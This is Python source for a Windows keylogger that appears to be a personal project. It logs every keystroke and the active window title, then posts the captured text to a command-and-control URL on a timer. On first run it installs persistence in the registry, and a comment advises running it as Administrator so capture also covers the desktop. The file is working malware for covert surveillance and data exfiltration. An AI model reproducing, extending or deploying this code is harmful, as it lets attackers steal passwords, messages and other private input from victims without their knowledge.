import logging
import datetime
import os
import threading
import requests
from pynput import keyboard
from pathlib import Path
from config import C2_URL, SEND_INTERVAL, MACHINE_ID
from persistence import install, is_installed
import win32gui  #interacting with the windows gui

# config
# On Windows: to capture keys when the DESKTOP has focus, run this script as Administrator
# (UIPI blocks lowlevel hooks for non-elevated processes when Explorer/Desktop is foreground).

BASE_DIR = Path(__file__).resolve().parent
LOG_FILE = BASE_DIR / "keylog.txt"

# setup logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format="%(message)s"
)

# Buffer
buffer = []
buffer_lock = threading.Lock()  # prevents race conditions - basically both agent and keylogger access the buffer = no good

# check the active window
def get_active_window():
    """Returns the title of the currently focused window."""
    try:
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    except:
        return "Unknown"

def send_to_c2():
    """Runs in background, sends buffer to C2 every SEND_INTERVAL seconds."""
    while True:
        threading.Event().wait(SEND_INTERVAL) 

        with buffer_lock: #lock the door, do my thing then unlock the door
            if buffer:
                data = "".join(buffer)
                buffer.clear()
            else:
                continue

        try:
            requests.post(C2_URL, data={
                "machine": MACHINE_ID,
                "data": data
            }, timeout=5)
        except requests.exceptions.RequestException:
            pass  # skbidiy fail if server is unreachable, 

current_window = ""
def on_press(key):
    if key == keyboard.Key.esc:
        return False  # stop listener

    global current_window

    active = get_active_window()
    if active != current_window:
        current_window = active
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        entry = f"\n\n[{timestamp}] Window: {active}\n"
        logging.info(entry)
        with buffer_lock:
            buffer.append(entry)

    try:
        ch = key.char
    except AttributeError: #special keys e.g. [Key.space]
        ch = f"[{key}]"

    logging.info(ch)
    with buffer_lock:
        buffer.append(ch)

# main
def start():
    if not is_installed(): #install the keylogger to the registry
        install()
        
    # Start sender thread as daemon - *LINUX REFERENCE* (dies when main program exits aka i press esc)
    sender = threading.Thread(target=send_to_c2, daemon=True)
    sender.start()

    # Start shell agent thread as daemon - *LINUX REFERENCE* (dies when main program exits aka i press esc)
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start()